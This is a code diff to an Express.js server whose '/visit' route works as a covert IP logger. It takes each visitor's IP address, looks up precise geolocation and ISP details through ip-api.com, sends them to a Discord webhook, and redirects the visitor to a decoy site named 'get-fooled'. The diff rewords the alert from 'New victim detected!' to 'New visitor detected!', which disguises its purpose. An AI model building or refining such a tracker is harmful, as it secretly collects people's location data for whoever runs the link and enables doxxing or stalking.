@@ -10,18 +10,23 @@ app.use(express.static(path.join(__dirname, "public")));
 
 // Tracking route
 app.get("/visit", async (req, res) => {
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;
+    // Get real visitor IP
+    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || req.connection.remoteAddress;
+
+    if (ip.includes(",")) ip = ip.split(",")[0].trim();
+    if (ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
+
     console.log("Visitor IP:", ip);
 
     try {
-        // Fetch geolocation data
+        // Get geo data from ip-api.com
         const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=query,status,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname`);
         const geoData = await geoResponse.json();
         console.log("Geo data:", geoData);
 
-        // Prepare Discord payload
+        // Send to Discord
         const payload = {
-            content: `📢 New victim detected!
+            content: `📢 New visitor detected!
 🌐 IP: ${geoData.query}
 ✅ Status: ${geoData.status}
 🌍 Continent: ${geoData.continent} (${geoData.continentCode})
@@ -35,7 +40,6 @@ app.get("/visit", async (req, res) => {
 🆔 AS/ASName: ${geoData.as}, ${geoData.asname}`
         };
 
-        // Send to Discord
         const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -43,15 +47,14 @@ app.get("/visit", async (req, res) => {
         });
         console.log("Discord response status:", discordResponse.status);
 
-        // Redirect visitor to your website
-        res.redirect("https://wasted-potentials-management.onrender.com");
+        // Redirect to your public website
+        res.redirect("https://get-fooled.onrender.com");
     } catch (err) {
         console.error("Error sending to Discord:", err);
         res.sendStatus(500);
     }
 });
 
-// Listen on Render's assigned port
+// Use Render's port and bind to 0.0.0.0
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
-
